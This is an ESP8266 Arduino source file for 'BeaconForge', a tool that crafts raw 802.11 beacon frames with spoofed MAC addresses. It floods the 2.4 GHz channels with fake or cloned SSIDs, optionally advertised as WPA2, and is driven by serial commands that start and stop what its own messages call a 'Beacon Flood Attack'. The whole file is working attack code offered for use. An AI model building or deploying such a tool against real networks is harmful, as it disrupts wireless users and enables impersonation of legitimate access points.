/*
 * BeaconForge
 * An ESP8266-based WiFi beacon tool that broadcasts configurable or randomly generated SSIDs over the 2.4 GHz band.
 * Author - WireBits
 */

#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

int cloneCount = 0;
String baseSSID = "";
bool wpa2Enabled = true;
bool randomMode = false;
int randomSSIDLength = 8;
const int macCount = 100;
bool attackRunning = false;
static int macIndexCounter = 0;
const uint8_t macStartLastByte = 0x11;
const uint8_t macBaseFirst5[5] = {0x02, 0x1A, 0x3C, 0x4F, 0x9B};
String ssidCharset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

void getMacFromList(int index, uint8_t outMac[6]) {
  memcpy(outMac, macBaseFirst5, 5);
  uint8_t last = macStartLastByte + (index % macCount);
  outMac[5] = last;
}

void sendCustomBeacons(char* base_ssid, int count, bool wpa2) {
  if (randomMode) {
    for (int i = 0; i < count; i++) {
      String ssid = "";
      int charsetLen = ssidCharset.length();
      for (int p = 0; p < randomSSIDLength; p++) {
        int idx = random(charsetLen);
        ssid += ssidCharset.charAt(idx);
      }
      char buffer_ssid[33];
      ssid.toCharArray(buffer_ssid, 33);
      sendBeacon(buffer_ssid, wpa2);
      delay(1);
    }
    return;
  }
  int base_ssid_lenght = strlen(base_ssid);
  int i = 0;
  for (int j = 0; j < 32 - base_ssid_lenght; j++) {
    for (int k = 0; k < pow(2, j); k++) {
      int sp_ch = k;
      String ssid = base_ssid;
      for (int repeat = 0; repeat < j; repeat++) {
        ssid += (sp_ch % 2 == 1) ? " " : "\t";
        sp_ch /= 2;
      }
      char buffer_ssid[33];
      ssid.toCharArray(buffer_ssid, 33);
      sendBeacon(buffer_ssid, wpa2);
      delay(1);
      if (i++ >= count) {
        return;
      }
    }
  }
}

void sendBeacon(char* ssid, bool wpa2) {
  byte channels[] = {1, 6, 11};
  byte channel = channels[random(0, 3)];
  wifi_set_channel(channel);

  uint8_t beaconPacket[256] = {
    0x80, 0x00,
    0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00,
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
    0xe8, 0x03,
    0x00, 0x00,
    0x00, 0x20,
  };

  int beacon_ssid_lenght = strlen(ssid);
  if (beacon_ssid_lenght > 32) {
    beacon_ssid_lenght = 32;
  }
  beaconPacket[37] = beacon_ssid_lenght;
  for (int i = 0; i < beacon_ssid_lenght; i++) {
    beaconPacket[38 + i] = ssid[i];
  }
  int beacon_packet_position = 38 + beacon_ssid_lenght;

  uint8_t ratesAndChannel[] = {
    0x01, 0x08,
    0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
    0x03, 0x01,
    0x00
  };
  ratesAndChannel[10] = channel;
  memcpy(&beaconPacket[beacon_packet_position], ratesAndChannel, sizeof(ratesAndChannel));
  beacon_packet_position += sizeof(ratesAndChannel);

  if (wpa2) {
    beaconPacket[34] |= 0x10;
    uint8_t rsnInfo[] = {
      0x30, 0x18,
      0x01, 0x00,
      0x00, 0x0f, 0xac, 0x02,
      0x02, 0x00,
      0x00, 0x0f, 0xac, 0x04,
      0x00, 0x0f, 0xac, 0x04,
      0x01, 0x00,
      0x00, 0x0f, 0xac, 0x02,
      0x00, 0x00
    };
    memcpy(&beaconPacket[beacon_packet_position], rsnInfo, sizeof(rsnInfo));
    beacon_packet_position += sizeof(rsnInfo);
  } else {
    beaconPacket[34] &= ~0x10;
  }
  uint8_t useMac[6];
  getMacFromList(macIndexCounter, useMac);
  macIndexCounter = (macIndexCounter + 1) % macCount;
  for (int i = 0; i < 6; i++) {
    beaconPacket[10 + i] = useMac[i];
    beaconPacket[16 + i] = useMac[i];
  }
  wifi_send_pkt_freedom(beaconPacket, beacon_packet_position, 0);
}

void handleSerial() {
  if (Serial.available()){
    String input = Serial.readStringUntil('\n');
    input.trim();
    String command = input;
    command.toLowerCase();
    if (command.startsWith("ssid ")) {
      if (randomMode) {
        randomMode = false;
        Serial.println("[*] Random mode disabled (fixed SSID selected).");
      }
      baseSSID = input.substring(5);
      if (baseSSID.length() > 32) {
        Serial.println("[!] Keep SSID names less than 32 characters!");
        return;
      }
      Serial.println("[*] SSID set to : " + baseSSID + "!");
    }
    else if (command.startsWith("clone ")) {
      int value = input.substring(6).toInt();
      if (value >= 1 && value <= 60) {
        cloneCount = value;
        Serial.println("[*] Clone Count set to : " + String(cloneCount) + "!");
      } else {
        Serial.println("[!] Invalid Clone Count (1 to 60)");
      }
    }
    else if (command.startsWith("wpa2 ")) {
      String value = input.substring(5);
      value.toLowerCase();
      if (value == "y" || value == "n") {
        wpa2Enabled = (value == "y") ? true : false;
        Serial.println(wpa2Enabled ? "[*] WPA2 Enabled!" : "[*] WPA2 Disabled!");
      } else {
        Serial.println("[!] Invalid WPA2 option (use 'y' or 'n')");
      }
    }
    else if (command.startsWith("length ")) {
      if (!randomMode) {
        Serial.println("[!] 'length' only works when random mode is enabled. Use 'random' to enable it.");
      } else {
        int value = input.substring(7).toInt();
        if (value >= 8 && value <= 32) {
          randomSSIDLength = value;
          Serial.println("[*] Random SSID length set to " + String(randomSSIDLength) + "!");
        } else {
          Serial.println("[!] Invalid length! Use a value between 8 and 32!");
        }
      }
    }
    else if (command == "random") {
      randomMode = !randomMode;
      if (randomMode) {
        if (randomSSIDLength < 8) randomSSIDLength = 8;
        if (randomSSIDLength > 32) randomSSIDLength = 32;
        Serial.println("[*] Random SSID mode enabled. Length = " + String(randomSSIDLength) + "!");
      } else {
        Serial.println("[*] Random SSID mode disabled!");
      }
    }
    else if (command == "start") {
      if ((baseSSID != "" && !randomMode) || (randomMode && randomSSIDLength >= 8 && cloneCount > 0) || (!randomMode && baseSSID != "" && cloneCount > 0)) {
        if (cloneCount <= 0) {
          Serial.println("[!] Set Clone Count first!");
          return;
        }
        attackRunning = true;
        Serial.println("[*] Beacon Flood Attack Started!");
      } else {
        Serial.println("[!] Set SSID and Clone Count First! For random mode: enable 'random' and set 'clone' and optionally 'length'.");
      }
    }
    else if (command == "stop") {
      attackRunning = false;
      Serial.println("[*] Beacon Flood Attack Stopped!");
    }
    else if (command == "help") {
      showHelp();
    } else {
      Serial.println("[!] Invalid command. Type 'help' for available commands.");
    }
  }
}

void showHelp() {
  Serial.println("\nAvailable Commands:");
  Serial.println("  random            - Sets random SSID name");
  Serial.println("  length X          - Sets random SSID name length (X = 8 to 32 chars)");
  Serial.println("  ssid SSIDNAME     - Sets custom SSID name");
  Serial.println("  clone Y           - Sets the number of clones (Y = 1 to 60)");
  Serial.println("  wpa2 y/n          - Enables/Disables WPA2 encryption for the fake SSIDs");
  Serial.println("  start             - Starts the beacon attack");
  Serial.println("  stop              - Stops the beacon attack");
  Serial.println("  help              - Displays this help message\n");
}

void setup() {
  Serial.begin(115200);
  delay(500);
  randomSeed(micros());
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
}

void loop() {
  handleSerial();
  if (attackRunning) {
    sendCustomBeacons((char*)baseSSID.c_str(), cloneCount, wpa2Enabled);
  }
}